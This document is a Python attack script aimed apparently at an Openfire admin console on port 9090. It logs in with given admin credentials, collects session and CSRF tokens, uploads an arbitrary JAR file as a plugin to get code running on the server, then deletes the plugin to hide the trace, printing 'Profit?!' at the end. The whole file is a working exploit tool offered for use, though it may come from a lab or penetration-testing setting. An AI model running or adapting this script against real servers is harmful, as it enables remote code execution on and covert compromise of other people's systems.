#!/usr/bin/python3

import requests
import sys
import pathlib

if len(sys.argv) <= 4:
    print(f'USAGE: python3 {sys.argv[0]} <admin_user> <admin_password> <Target_IP> <Jar_File>')
    exit(1)

#get cookie and jsessionid
get_csrf = f'http://{sys.argv[3]}:9090/login.jsp'
session = requests.Session()
r = session.get(get_csrf)
cook = session.cookies.get_dict()
jsessionid = cook['JSESSIONID']
print('[+] Get JSESSIONID & CSRF Token')
csrf = cook['csrf']

#login
print('[-] Logging in as administrator')
login_url = f'http://{sys.argv[3]}:9090/login.jsp'
data = f'url=%2Findex.jsp&login=true&csrf={csrf}&username={sys.argv[1]}&password={sys.argv[2]}'
sess = requests.Session()
r = sess.post(login_url, data=data, headers={"Content-Type":"application/x-www-form-urlencoded","Cookie":f"JSESSIONID={jsessionid}; csrf={csrf}"})
cook = sess.cookies.get_dict()
csrf2 = cook['csrf']
print('[+] Logged in Admin Console')
jsessionid2 = cook['JSESSIONID']

get_csrf3 = f'http://{sys.argv[3]}:9090/plugin-admin.jsp'
session = requests.Session()
r = session.get(get_csrf3, headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf2}"})
cook = session.cookies.get_dict()
print('[+] Get JSESSIONID & CSRF Token')
csrf3 = cook['csrf']

#upload jar file
print('[-] Uploading plugin file')
jar_url = f'http://{sys.argv[3]}:9090/plugin-admin.jsp?uploadplugin&csrf={csrf3}'

jar_file = {('filename', ('doesntmatter.jar', open(f'{sys.argv[4]}','rb'), 'application/java-archive'))}
t = requests.post(jar_url, files=jar_file, headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf3}"})
print('[+] Uploaded Plugin')

#delete plugin
print('[-] Deleting Plugin')
y = requests.get(f'http://{sys.argv[3]}:9090/plugin-admin.jsp?csrf={csrf3}&deleteplugin=doesntmatter', headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf3}"})
print('[+] Deleted Plugin')
print('[+] Profit?!')
